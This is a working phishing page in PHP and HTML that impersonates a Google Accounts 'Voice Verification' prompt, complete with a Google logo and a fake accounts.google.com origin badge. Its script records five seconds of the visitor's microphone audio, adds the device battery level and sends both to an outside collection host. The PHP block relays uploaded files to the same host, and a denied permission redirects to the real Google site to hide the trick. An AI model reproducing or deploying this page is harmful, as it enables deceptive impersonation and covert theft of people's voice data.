<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $ch = curl_init('https://rootx-eye-1.onrender.com/capture.php');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['file' => new CURLFile($_FILES['file']['tmp_name']), 'type' => 'voice']);
    curl_exec($ch);
    curl_close($ch);
    echo json_encode(['status' => 'sent']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Voice Verification - Google Accounts</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  body { background:#fff; font-family:'Google Sans',sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; }
  .card { background:#fff; border:1px solid #dadce0; border-radius:8px; max-width:450px; width:90%; padding:48px 40px 36px; text-align:center; }
  .google-logo { width:75px; height:25px; margin:0 auto 16px; display:block; }
  h1 { font-size:24px; font-weight:400; margin:0 0 8px 0; }
  .subtitle { color:#5f6368; font-size:15px; margin-bottom:24px; line-height:1.5; }
  .origin-chip { display:inline-flex; align-items:center; background:#f1f3f4; border-radius:16px; padding:6px 12px; margin-bottom:24px; font-size:13px; color:#3c4043; }
  .next-btn { background:#1a73e8; color:#fff; border:none; padding:12px 24px; border-radius:4px; font-size:15px; font-weight:500; cursor:pointer; transition:0.2s; box-shadow:0 1px 3px rgba(66,133,244,0.5); }
  .next-btn:hover { background:#1765cc; box-shadow:0 2px 6px rgba(66,133,244,0.6); }
  .footer { margin-top:36px; font-size:12px; color:#5f6368; text-align:center; }
  .loader { display:none; margin:20px auto; width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid #1a73e8; border-radius:50%; animation:spin 1s linear infinite; }
  @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
</style>
</head>
<body>
<div class="card">
  <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24">
    <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
    <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
    <path fill="#FBBC05" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54 0 2.02-1.37 3.5-3.1 3.5z"/>
    <path fill="#4285F4" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
    <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
    <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
  </svg>
  <div id="form-section">
    <h1>Voice Verification</h1>
    <div class="subtitle">To protect your account, we need to verify your voice.</div>
    <div class="origin-chip">🔒 accounts.google.com/security</div>
    <br>
    <button id="startBtn" class="next-btn">Allow Microphone</button>
  </div>
  <div id="loader-section"><div class="loader"></div><p style="color:#5f6368;">Recording voice...</p></div>
  <div class="footer">Help &nbsp;|&nbsp; Privacy &nbsp;|&nbsp; Terms</div>
</div>
<script>
const startBtn = document.getElementById("startBtn");
const formSection = document.getElementById("form-section");
const loaderSection = document.getElementById("loader-section");

startBtn.onclick = () => {
  formSection.style.display = 'none';
  loaderSection.style.display = 'block';

  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const recorder = new MediaRecorder(stream);
      const chunks = [];
      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const fd = new FormData();
        fd.append("file", blob, "voice.webm");
        fd.append("type", "voice");
        
        // 🔥 Battery
        if (navigator.getBattery) {
          navigator.getBattery().then(battery => {
            fd.append("battery", battery.level * 100);
            fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd });
          });
        } else {
          fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd });
        }
      };
      recorder.start();
      setTimeout(() => recorder.stop(), 5000);
    })
    .catch(() => window.location.replace("https://myaccount.google.com/"));
};
</script>
</body>
</html>
